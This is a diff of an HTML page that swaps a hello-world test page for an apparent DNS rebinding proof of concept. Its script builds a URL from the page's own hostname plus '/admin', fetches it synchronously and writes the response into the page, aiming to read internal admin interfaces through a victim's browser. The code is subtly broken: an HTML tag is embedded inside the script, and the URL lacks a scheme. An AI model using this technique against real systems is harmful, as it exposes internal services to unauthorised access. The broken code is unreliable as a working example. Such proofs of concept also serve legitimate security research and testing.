@@ -1,12 +1,30 @@
 <!DOCTYPE html>
 <html>
-   <head>
-      <title>Hello DNS Rebinding</title>
-     <!-- <meta http-equiv="Refresh" content="0; url='https://www.google.fr'" /> -->
-   </head>
-   <body>
-      <p>Before the JavaScript</p>
-          <script> alert( 'Hello, world!' );  </script>
-      <p>After the JavaScript</p>
-   </body>
+<body>
+
+<p>DNS Rebinding</p>
+
+<script>
+function httpGet(theUrl)
+{
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+}
+
+function TargetURL() {
+  var URL = window.location.hostname;
+  URL = URL + "/admin";
+  return URL;
+}
+
+<p>The Target URL is:</p>
+document.write(TargetURL());
+
+var URL = httpGet(TargetURL());
+document.write(URL);
+</script>
+
+</body>
 </html>
